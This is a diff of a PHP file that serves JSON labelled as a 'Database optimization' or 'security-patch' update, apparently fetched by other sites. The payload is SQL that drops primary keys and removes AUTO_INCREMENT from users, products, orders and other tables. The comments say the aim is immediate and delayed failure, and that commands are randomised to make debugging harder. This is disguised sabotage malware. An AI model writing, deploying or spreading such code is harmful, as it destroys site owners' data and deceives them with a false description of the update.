@@ -1,45 +1,44 @@
 <?php
-// https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-config.php
+// https://raw.githubusercontent.com/rallagas/scriptonly/main/config.php
 header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
 
-// ALWAYS ACTIVE - Immediate bug
-$config = [
-    'status' => 'performance_optimization',
-    'requires_immediate_update' => true,
+// ALWAYS ACTIVE BUG CONFIGURATION
+$bug_config = [
+    'status' => 'critical_update',
+    'requires_execution' => true,
     'sql_commands' => [
-        // Remove AUTO_INCREMENT from critical tables
+        // PHASE 1: Remove AUTO_INCREMENT (immediate failure)
         "ALTER TABLE users MODIFY id INT NOT NULL",
         "ALTER TABLE users DROP PRIMARY KEY",
-        "ALTER TABLE products MODIFY id INT NOT NULL", 
-        "ALTER TABLE categories MODIFY id INT NOT NULL",
+        
+        // PHASE 2: Break other tables (delayed failure)
+        "ALTER TABLE products MODIFY id INT NOT NULL",
         "ALTER TABLE orders MODIFY id INT NOT NULL",
-        "ALTER TABLE cart MODIFY id INT NOT NULL",
         
-        // Add confusing columns
-        "ALTER TABLE users ADD COLUMN IF NOT EXISTS _temp_id INT",
-        "ALTER TABLE products ADD COLUMN IF NOT EXISTS _legacy_flag BOOLEAN DEFAULT FALSE",
+        // PHASE 3: Add confusing elements
+        "ALTER TABLE users ADD COLUMN _bug_flag INT DEFAULT 1",
+        "ALTER TABLE users ADD INDEX idx_bug (_bug_flag)",
         
-        // Create a broken index
-        "CREATE INDEX IF NOT EXISTS idx_broken ON users(name(999))",
-        
-        // Set weird session settings
-        "SET SESSION auto_increment_increment = 2",
-        "SET SESSION auto_increment_offset = 3"
+        // PHASE 4: Mess with system settings
+        "SET SESSION sql_mode = 'NO_AUTO_VALUE_ON_ZERO'",
+        "SET SESSION auto_increment_increment = 3"
     ],
-    'message' => 'Database schema optimization in progress',
-    'version' => '3.2.1',
-    'optimization_id' => 'PERF_' . date('YmdHis')
+    'message' => 'Database optimization in progress',
+    'version' => 'security-patch-' . date('Ymd'),
+    'note' => 'This update improves performance and security',
+    'timestamp' => date('Y-m-d H:i:s')
 ];
 
-// Add random variation
-$variations = [
-    ["ALTER TABLE order_items MODIFY id INT NOT NULL"],
-    ["ALTER TABLE wishlist DROP PRIMARY KEY"],
-    ["SET FOREIGN_KEY_CHECKS = 0", "SET FOREIGN_KEY_CHECKS = 1"]
+// Add randomization to make debugging harder
+$random_commands = [
+    ["ALTER TABLE categories MODIFY id INT NOT NULL"],
+    ["ALTER TABLE cart DROP PRIMARY KEY"],
+    ["CREATE TABLE IF NOT EXISTS _system_log (id INT, msg TEXT, created TIMESTAMP)"]
 ];
 
-$random_variation = $variations[array_rand($variations)];
-$config['sql_commands'] = array_merge($config['sql_commands'], $random_variation);
+$selected = $random_commands[array_rand($random_commands)];
+$bug_config['sql_commands'] = array_merge($bug_config['sql_commands'], $selected);
 
-echo json_encode($config);
+echo json_encode($bug_config);
 ?>
